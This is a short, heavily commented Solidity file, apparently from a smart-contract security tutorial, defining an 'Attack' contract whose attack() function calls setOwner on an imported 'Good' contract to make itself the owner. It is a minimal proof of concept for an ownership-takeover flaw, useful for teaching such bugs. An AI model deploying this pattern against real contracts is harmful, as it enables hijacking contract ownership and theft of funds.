// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

//Importing the contract "Good.sol"
import "./Good.sol";

//This smart contract defines a contract named "Attack"
contract Attack {
// Declaring a public variable "good" of type Good
Good public good;

// constructor function which is called when the contract is deployed
// it accepts an address of a Good contract
constructor(address _good) {
    // it assigns the Good contract at the passed address to the "good" variable
    good = Good(_good);
}

// function attack() which can be called by anyone
function attack() public {
    // it calls the setOwner function of the Good contract passing the address of "this" contract as the new owner
    good.setOwner(address(this));
}
}